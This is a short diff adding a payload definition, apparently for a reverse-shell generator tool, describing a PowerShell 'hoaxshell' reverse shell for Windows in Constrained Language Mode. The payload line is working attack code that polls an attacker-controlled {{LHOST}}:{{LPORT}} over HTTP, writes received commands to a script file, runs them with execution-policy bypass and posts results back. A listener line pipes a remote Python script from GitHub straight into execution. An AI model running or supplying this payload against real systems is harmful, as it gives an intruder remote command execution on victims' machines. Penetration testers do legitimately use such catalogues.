@@ -1,0 +1,12 @@
+id = "hoaxshell_powershell_outfile_clm"
+name = "PowerShell Outfile Constr Lang Mode"
+os = "windows"
+type = "hoaxshell"
+proto = "http"
+lang = "powershell"
+description = "PowerShell reverse shell using Outfile in Constrained Language Mode and HoaxShell HTTP."
+
+payload = "$s='{{LHOST}}:{{LPORT}}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}"
+
+[listeners]
+hoaxshell = "python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t http -p {{LPORT}}"
